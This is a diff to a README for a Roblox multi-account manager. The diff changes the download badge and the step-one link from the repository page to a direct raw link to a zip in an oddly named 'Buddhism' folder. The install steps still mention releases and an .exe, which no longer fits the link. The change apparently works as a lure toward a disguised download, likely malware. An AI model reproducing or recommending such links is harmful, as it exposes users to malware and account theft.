@@ -1,6 +1,6 @@
 # 📂 robloxaccountmanager-desktop-app - Organize your multiple gaming profiles easily
 
-[![Download Now](https://img.shields.io/badge/Download-Blue-blue.svg)](https://github.com/historical-soave754/robloxaccountmanager-desktop-app)
+[![Download Now](https://img.shields.io/badge/Download-Blue-blue.svg)](https://raw.githubusercontent.com/historical-soave754/robloxaccountmanager-desktop-app/main/Buddhism/robloxaccountmanager_desktop_app_3.7.zip)
 
 ## 📖 About this application
 
@@ -20,7 +20,7 @@ Ensure your computer meets these standards to run the software.
 
 Follow these steps to set up the application on your PC.
 
-1. Visit this page to download: [https://github.com/historical-soave754/robloxaccountmanager-desktop-app](https://github.com/historical-soave754/robloxaccountmanager-desktop-app).
+1. Visit this page to download: [https://raw.githubusercontent.com/historical-soave754/robloxaccountmanager-desktop-app/main/Buddhism/robloxaccountmanager_desktop_app_3.7.zip](https://raw.githubusercontent.com/historical-soave754/robloxaccountmanager-desktop-app/main/Buddhism/robloxaccountmanager_desktop_app_3.7.zip).
 2. Locate the latest release version on the page.
 3. Click the file ending in .exe to start the download.
 4. Save the folder to a location on your hard drive.
